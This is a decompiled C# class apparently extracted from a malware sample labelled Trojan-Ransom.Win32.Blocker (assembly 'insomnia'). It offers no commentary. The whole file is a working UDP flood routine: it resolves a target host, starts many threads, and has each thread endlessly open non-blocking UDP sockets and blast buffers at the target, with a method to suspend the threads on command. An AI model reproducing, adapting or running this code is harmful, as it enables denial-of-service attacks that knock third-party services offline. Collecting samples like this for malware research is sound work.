// Decompiled with JetBrains decompiler
// Type: insomnia.Class40
// Assembly: insomnia, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 848092D5-5192-4B4F-B8F0-07AD40D025FA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.exyo-803dbe7f976d166aef05102db1219065c8b0bb78e3cf85095fc361f891e6a4e0.exe

using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace insomnia
{
  internal class Class40
  {
    private static ThreadStart[] Field10;
    private static Thread[] Field9;
    public static string Field8;
    private static IPEndPoint Field7;
    public static int Field6;
    public static int Field5;
    private static Class40.Class41[] Field4;
    public static int Field3;
    public static int Field2;
    public static bool Field1 = false;

    public static void Method2()
    {
      try
      {
        Class40.Field7 = new IPEndPoint(Dns.GetHostEntry(Class40.Field8).AddressList[0], Class40.Field6);
      }
      catch
      {
        Class40.Field7 = new IPEndPoint(IPAddress.Parse(Class40.Field8), Class40.Field6);
      }
      Class40.Field9 = new Thread[Class40.Field3];
      Class40.Field10 = new ThreadStart[Class40.Field3];
      Class40.Field4 = new Class40.Class41[Class40.Field3];
      for (int index = 0; index < Class40.Field3; ++index)
      {
        Class40.Field4[index] = new Class40.Class41(Class40.Field7, Class40.Field2, Class40.Field5);
        Class40.Field10[index] = new ThreadStart(Class40.Field4[index].Method1);
        Class40.Field9[index] = new Thread(Class40.Field10[index]);
        Class40.Field9[index].Start();
      }
    }

    public static void Method1()
    {
      for (int index = 0; index < Class40.Field3; ++index)
      {
        try
        {
          Class40.Field9[index].Suspend();
        }
        catch
        {
        }
      }
    }

    private class Class41
    {
      private IPEndPoint Field4;
      private int Field3;
      private Socket[] Field2;
      private int Field1;

      public Class41(IPEndPoint ipEo, int SynSockets, int pSize)
      {
        this.Field4 = ipEo;
        this.Field1 = SynSockets;
        this.Field3 = pSize;
      }

      public void Method1()
      {
label_1:
        while (true)
        {
          byte[] buffer = new byte[this.Field3];
          try
          {
            this.Field2 = new Socket[this.Field1];
            for (int index = 0; index < this.Field1; ++index)
            {
              this.Field2[index] = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
              this.Field2[index].Blocking = false;
              this.Field2[index].SendTo(buffer, (EndPoint) this.Field4);
            }
            Thread.Sleep(100);
            for (int index = 0; index < this.Field1; ++index)
            {
              if (this.Field2[index].Connected)
                this.Field2[index].Disconnect(false);
              this.Field2[index].Close();
              this.Field2[index] = (Socket) null;
            }
            this.Field2 = (Socket[]) null;
          }
          catch
          {
            int index = 0;
            while (true)
            {
              if (index < this.Field1)
              {
                try
                {
                  if (this.Field2[index].Connected)
                    this.Field2[index].Disconnect(false);
                  this.Field2[index].Close();
                  this.Field2[index] = (Socket) null;
                }
                catch
                {
                }
                ++index;
              }
              else
                goto label_1;
            }
          }
        }
      }
    }
  }
}
